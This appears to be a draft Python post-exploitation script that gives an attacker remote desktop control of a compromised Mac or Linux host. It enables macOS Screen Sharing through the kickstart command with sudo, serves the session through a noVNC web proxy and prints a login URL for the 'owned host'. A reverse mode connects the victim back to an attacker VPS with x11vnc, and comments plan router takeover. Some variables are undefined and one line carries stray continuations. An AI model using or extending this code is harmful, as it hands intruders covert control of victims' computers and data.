
#!/usr/bin/python
import os, subprocess, operator, sys
# design: the attacker brings the VNC binary with it in the shell

# scratch that, the victim, a mac osx machine, possesses their own vnc server called screen sharing
# Then it will open a HTTPS proxy via novnc to allow it to host it's own webserver with the HTTPS login page

# TO DO

# Learn the Apple Screen Sharing App's method of initating Forward & Reverse VNC connections and replace it
# Segregate commands by Victim and Attacker
# Also segregate by role of VNC server and VNC client

# Operating Mode

opmode = "Forward" # victim hosts vnc server and awaits attacker's connection
# Opmode = "Reverse" # attacker hosts vnc listener and awaits victim's connection back

def popen_subprocess(cmd):
    p = subprocess.Popen(
        cmd,
        shell=True,
        executable='/bin/bash',
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
        )
    o = p.stdout.read()
    output = str(o.encode('utf-8')).strip().rstrip()
    return output

# analysis of competition

# Empire/Powershell-Empire

## Interface extremely difficult to use
## Several modules failed to show proper output of dumped hashes, especially the chainbreaker.py exploit

if opmode == "Forward":
    # activate native VNC server in Mac OSX
    cmd = """echo {} | sudo -S sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -clientopts -setvnclegavy -vnclegavy yes -clientopts -setvncpw -vncpw {} -restart -agent -privs -all""".format(
        str(rootpw),
        str(vncpw)
    )
    vnc_activate_cmd = subprocess.Popen(
        cmd,
        shell=True,
        executable='/bin/bash',
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
        )


    # activate novnc HTTPS viewer

    # scratch that. No HTTPS. Due to dog-assed fucking Firefox not accepting self-signed certificates.
    # first implement this method, then experiment with ways of providing TLS encryption. Such as GNUTLS.
    # openssl isn't to blame, albeit their commands are convoluted nowadays
    # we cannot use mkcert because mkcert is inherently insecure upon compromise of the root CA (yourself)
    # although Firefox's NSS certutil is outright horrible

    # the beauty of coding your own framework is that you do not have to be beholden to someone else's bad ideas. You can always write yourself a workaround


    # start vncserver on Linux machine 
    find_vnc_port = "vncserver && netstat -antp | grep -i vnc | grep 59 | grep LISTEN | awk -F ':' '{print $2}' | awk '{print $1}'"

    vncport = popen_subprocess(find_vnc_port)\
    \
    # start novnc HTTP proxy
    cmd = "cd /usr/share/novnc/utils/ && ./launch.sh --listen {} --vnc localhost:{}".format(
        str(httpport),
        str(vncport)
    )
    http_vnc_cmd = subprocess.Popen(
        cmd,
        shell=True,
        executable='/bin/bash',
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    # login URL is

    host = popen_subprocess("dig +short myip.opendns.com @resolver1.opendns.com.")

    loginurl = "http://{0}:{1}/vnc.html?host={0}&port={1}".format(
        str(host),
        str(httpport)
    )

    print "Your owned host's web-accessible VNC viewer:\t",str(loginurl)

# be aware that a household NATed connection is very likely, possible. In that case, it may not be a public facing IP address thats connectable, rather, we need to...

# 1. Own the router
# 2. Open a port on the router that forwards to the internal host and VNC server
# 3. OR, create a reverse proxy using tinyproxy pointing outwards but still leading back to the internal host

# But the router has to be pwned pretty much. Unless...

# Owned Host ---- Reverse Shell ---->
# Owned Host ---- VNC reverse shell ----> Remote VPS (with a proxy tunnel bound locally to the server)

# Then to login to VNC, you would just access http://attackerserver:boundport
# vncviewer -listen
# x11vnc --connect 18.232.30.135:5501

if opmode == "Reverse":
    # attacker's VPS client side commands

    cmd = "vncviewer -listen | awk -F 'port' '{print $2}'"
    LPORT = popen_subprocess(cmd)
    LHOST = popen_subprocess("dig +short myip.opendns.com @resolver1.opendns.com.")

    # victim's server side commands
    cmd = "x11vnc --connect {}:{}".format(
        str(LHOST),
        str(LPORT)
    )

    session = popen_subprocess(cmd)
